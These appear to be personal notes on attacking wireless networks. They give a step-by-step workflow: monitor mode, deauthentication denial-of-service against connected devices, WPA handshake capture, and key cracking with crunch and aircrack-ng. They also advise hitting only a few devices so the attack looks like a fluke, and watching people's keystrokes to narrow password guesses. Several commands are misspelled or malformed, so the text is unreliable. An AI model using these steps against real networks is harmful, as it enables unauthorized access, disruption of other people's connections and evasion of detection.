PenTesting / Ethical Hacking Notes: 

- TOPIC: Wireless Hacking

1. You are better off getting the IP of a router and attacking it directly rather than trying to crack WPA / 2. 
The router is more than likely going to have holes in it. 

2. Do not password crack on a VM. You are going to have a bad time. 

3. Tools you will need: 
aircrack <- key cracking 
reaver <- guesses pins on a router [grab this from google code]

aircrack has a package that also allows you to run a dos attack against wireless networks around you. 
so long as you: 
- are in close proximity to the router 
- are able to obtain the MAC addr of the router / person via scanning
- NIC monitor mode will be your friend [to find MAC addrs]

4. Sidenote: Its time to build a dedicated linux box. 

5. Crunch: 
Use crunch to generate password lists. This is installed on Kali. 

6. So now you can use crunch and pass the passwords directly into aircrack

7: HOW TO: 

Setup Monitor Mode
- go into ifconfig and find your wifi card
- ifconfig name_of_wifi_card down 
- iwconfig name_of_wifi_card mode monitor 
- ifconfig name_of_wifi_card up 

1a. Check for interferance
- airmon-ng check name_of_wifi_card
IN ORDER
- "kill process_number" kill the NETWORK MANAGER if up 
- "kill process_number" kill the DHCLIENT if up
- "kill process_number" kill the WPA_SUPPLICANT if up
Kill the rest in any order you fancy.
check one more time

2a. Run a scan: 
- airodump-ng name_of_wifi_card:
this will show you all the access points
BSSID: MAC addr of the access point
PWR: is the signal strength -15 is better than -30 as an example

Once you find a network to attack you will need to run a more specific scan: 
-c is for channel
-w write to a file
-bssid is for MAC address

- airodump-ng -c [NUMBER] -w [FILENAME] --bssid [MAC ADDRESS OF ACCESS POINT] name_of_wifi_card

In the results look for a Station that is connected to the access point.

3a. - BEGIN NEFARIOUS STUFF -

Now with the information you have you can de-authenticat a connected device. 
- note, when passing the second 0 you are starting a loop that will nuke everything connected. 
If you want to temp disconnect devices you could place a 10 or 9. 

- airreplay-ng -0 0 -a [MAC ADDRESS OF ACCESS POINT] name_of_wifi_card

You can now stop the dos and go back into the airdump log. Wait for the WPA HANDSHAKE to appear. <----!!!!!!!!
BE SMART: don't nuke all the devices on an access point. Only hit a few so it seems like a local machine fluke. 

4a. Crack the password
PROTIP Social Eng: take note of number / type of keystrokes people are entering in: 
- t specify a pattern for crunch [check the man pages]
- 11's are an example of the password length you need to pass
-- in this example using crunch to pass a series of numbers in front of the part of the password you know and give a range. 
then pass it to aircrack.
- w wordlist you can either generate one or download. 
- e SSID you are attacking 

- crunch 11 11 -t %%%%Thunder 1234567890 | aircrack-ng -w -[FILENAME from step 2a] -e [SSID]

If you want to run this attack using the crunch charlist you would run: 

- crunch 11 11 -t %%%%Thunder -f charset.lst mixalpha-numeric-space | aircrack-ng -w -[FILENAME from step 2a] -e [SSID]
